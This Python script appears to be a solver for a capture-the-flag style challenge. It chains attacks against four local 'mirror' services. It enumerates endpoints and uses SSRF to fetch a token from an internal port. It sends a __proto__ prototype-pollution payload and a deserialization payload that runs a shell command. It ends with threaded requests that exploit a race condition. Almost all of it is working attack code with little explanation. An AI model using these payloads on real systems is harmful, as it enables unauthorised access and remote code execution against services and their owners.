#!/usr/bin/env python


import requests
import threading
import time

server_ip = ""

BASE_URLS = {
    "mirror1": f"http://{server_ip}:5001",
    "mirror2": f"http://{server_ip}:5002",
    "mirror3": f"http://{server_ip}:5003",
    "mirror4": f"http://{server_ip}:5004"
}

# List of all known endpoints (100 endpoints)
ENDPOINTS = [
    "admin", "login", "logout", "dashboard", "settings", "profile", "help", "api", "status", "config",
    "debug", "encode", "stop", "update", "upload", "download", "backup", "restore", "reset", "user", "data", "search",
    "report", "export", "timeout", "fetch", "import", "activity", "audit", "analytics", "cache", "queue", "worker", "jobs",
    "monitor", "logs", "notifications", "messages", "preferences", "security", "access", "permissions", "roles",
    "tokens", "sessions", "hooks", "events", "integrations", "webhooks", "sync", "database", "system", "support",
    "file", "admin_panel", "billing", "customer", "developer", "server_status", "payment", "checkout", "cart",
    "order", "subscription", "renew", "user_settings", "team", "workspace", "audit_log", "email", "verification"
]

# ✅ Step 1: Visit All Endpoints to Pre-Qualify
def visit_all_endpoints():
    print("🔹 Visiting all API endpoints to pre-qualify for the challenge...")
    for base_url in BASE_URLS.values():
        for endpoint in ENDPOINTS:
            url = f"{base_url}/{endpoint}"
            try:
                response = requests.get(url)
                print(f"✅ Visited {url}, Status: {response.status_code}")
                time.sleep(0.2)  # Avoid rate limits
            except Exception as e:
                print(f"❌ Failed to visit {url}: {str(e)}")
    print("✅ All endpoints visited!")

# ✅ Step 2: Solve Mirror1 (SSRF)
def exploit_ssrf():
    url = f"{BASE_URLS['mirror1']}/fetch?url=http://127.0.0.1:5002"
    response = requests.get(url).json()
    token_1 = response.get("token", "")
    print(f"✅ Token 1: {token_1}")
    return token_1

# ✅ Step 3: Solve Mirror2 (Prototype Pollution)
def exploit_pollution(token_1):
    url = f"{BASE_URLS['mirror2']}/pollute"
    headers = {"X-Forwarded-Auth": "stage1key", "X-Auth-Tokens": token_1}
    payload = {"__proto__": {"admin": True}}
    response = requests.post(url, json=payload, headers=headers).json()
    token_2 = response.get("token", "")
    print(f"✅ Token 2: {token_2}")
    return token_2

# ✅ Step 4: Solve Mirror3 (JSON Deserialization RCE)
def exploit_deserialization(token_1, token_2):
    url = f"{BASE_URLS['mirror3']}/deserialize"
    headers = {"X-Forwarded-Auth": "stage3key", "X-Auth-Tokens": f"{token_1},{token_2}"}
    payload = {"execute": {"cmd": "touch /tmp/restricted/token3.txt"}}
    response = requests.post(url, json=payload, headers=headers).json()
    token_3 = response.get("token", "")
    print(f"✅ Token 3: {token_3}")
    return token_3

# ✅ Step 5: Solve Mirror4 (Race Condition)
def send_race_request(token_1, token_2, token_3):
    url = f"{BASE_URLS['mirror4']}/race"
    headers = {"X-Forwarded-Auth": "finalstage", "X-Auth-Tokens": f"{token_1},{token_2},{token_3}"}
    data = {"exploit": "race_condition"}
    response = requests.post(url, headers=headers, data=data).json()
    print(f"✅ Final Token: {response.get('token')}")

def exploit_race_condition(token_1, token_2, token_3):
    threads = []
    for _ in range(10):
        t = threading.Thread(target=send_race_request, args=(token_1, token_2, token_3))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

# ✅ Master Execution Flow
if __name__ == "__main__":
    visit_all_endpoints()
    token_1 = exploit_ssrf()
    token_2 = exploit_pollution(token_1)
    token_3 = exploit_deserialization(token_1, token_2)
    exploit_race_condition(token_1, token_2, token_3)
